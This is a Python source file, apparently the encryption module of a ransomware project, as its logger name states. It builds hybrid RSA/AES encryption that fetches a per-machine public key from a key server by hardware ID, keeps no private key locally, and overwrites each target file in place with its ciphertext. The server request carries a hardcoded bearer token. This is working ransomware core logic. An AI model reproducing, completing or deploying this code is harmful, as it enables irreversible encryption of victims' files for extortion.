import logging
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Util.Padding import pad
import http.client
from .utils import get_hwid
import json
from .exceptions import KeyPairCreationException

logger = logging.getLogger("ransomware")


RSA_DEFAULT_KEY_SIZE = 2048


class RSAAESEncryption:
    """
    RSA/AES encryption class

    This class is used to encrypt files using RSA and AES.

    The RSA key pair is generated on initialization and the private key is stored in a file.
    The public key is used to encrypt the AES session key
    and the AES session key is used to encrypt the file data.

    The encrypted data is written to a file with the same name as the original
    """

    def __init__(self, private_key: str | None = None, **kwargs) -> None:
        """
        Initialize the encryption class

        :param private_key: The private key to use for encryption
        :param kwargs: Additional keyword arguments
        """
        self._hwid = get_hwid()
        self.rsa_key_size = kwargs.get("rsa_key_size", RSA_DEFAULT_KEY_SIZE)
        self.public_key = self._load_remote_public_key()
        # self.public_key = None
        self.session_key = get_random_bytes(
            int(kwargs.get("aes_key_size", 16)))
        self.cipher_aes = None
        self.cipher_rsa = None
        self.enc_session_key: bytes = None
        self._prepare_cipher(
            int(kwargs.get(
                "aes_mode",
                AES.MODE_CBC)))

    def _prepare_cipher(self, aes_mode: int):
        """
        Prepare the cipher

        :param aes_mode: The AES mode to use
        """
        self.cipher_rsa = PKCS1_v1_5.new(self.public_key)
        self.cipher_aes = AES.new(self.session_key,
                                  aes_mode)

        # Encrypt the session key with the public RSA key
        self.enc_session_key = self.cipher_rsa.encrypt(self.session_key)

    def __repr__(self) -> str:
        return f"RSAAESEncryption(rsa_key_size={self.rsa_key_size})"

    # def _export_key(self):
    #     """
    #     Write the private key to a file
    #     """
    #     # TODO: Write key in a secure way (e.g. memory-mapped file)
    #     try:
    #         with open("key.pem", "wb+") as pkf:
    #             pkf.write(self.private_key.export_key())
    #             pkf.close()
    #     except Exception as e:
    #         logger.error(f"Error while exporting private key: {e}")

    # def _generate_rsa_key(self):
    #     """
    #     Generate a new RSA key pair

    #     :return: The generated RSA key pair
    #     """
    #     logger.info(f"Generating RSA key pair with size: {self.rsa_key_size}")
    #     return RSA.generate(self.rsa_key_size)

    def _overwrite_data(
            self,
            file_path: str,
            ciphertext: bytes):
        """
        Write the encrypted data to a file

        :param file_path: The path to the file
        :param ciphertext: The encrypted data

        :raises Exception: If an error occurs while writing the data
        """
        try:
            with open(file_path, "wb+") as overwrite_f:
                overwrite_f.write(self.enc_session_key)
                overwrite_f.write(self.cipher_aes.iv)
                overwrite_f.write(ciphertext)
                overwrite_f.close()
        except Exception as e:
            logger.error(f"Error while overwriting file: {file_path} - {e}")

    def encrypt(self, fpath: str) -> bytes:
        """
        Encrypt a file

        :param fpath: The path to the file

        :return: The encrypted data

        :raises Exception: If an error occurs while encrypting the file
        """
        try:
            dataf = open(fpath, "rb")
            data = dataf.read()

            # Encrypt the data with the AES session key
            ciphertext = self.cipher_aes.encrypt(pad(data, AES.block_size))
            dataf.close()
            self._overwrite_data(fpath, ciphertext)
            logger.debug(f"Encrypted file: {fpath}")
        except Exception as e:
            logger.error(f"Error while encrypting file: {fpath} - {e}")

    def _load_remote_public_key(self):
        """
        Load the public key from a file

        :return: The public key
        """

        conn = http.client.HTTPConnection("localhost", 12001)
        conn.request("GET", f"/keys/public_key/{self._hwid}/")
        response = conn.getresponse()
        data = json.loads(response.read())
        if response.status == 404:
            self._create_keypair()
            conn = http.client.HTTPConnection("localhost", 12001)
            conn.request("GET", f"/keys/public_key/{self._hwid}/")
            response = conn.getresponse()
            data = json.loads(response.read())
        return RSA.import_key(data["public_key"])

    def _create_keypair(self):
        """
        """
        conn = http.client.HTTPConnection("localhost", 12001)
        body = json.dumps({"uuid": self._hwid,
                           "Authorization": "Bearer akljnv13bvi2vfo0b0bw"})
        headers = {'Content-type': 'application/json', }
        conn.request("POST", f"/keys/", body=body, headers=headers)
        response = conn.getresponse()
        if response.status != 200:
            raise KeyPairCreationException("Error while creating key pair")
        logger.info("Key pair created successfully")
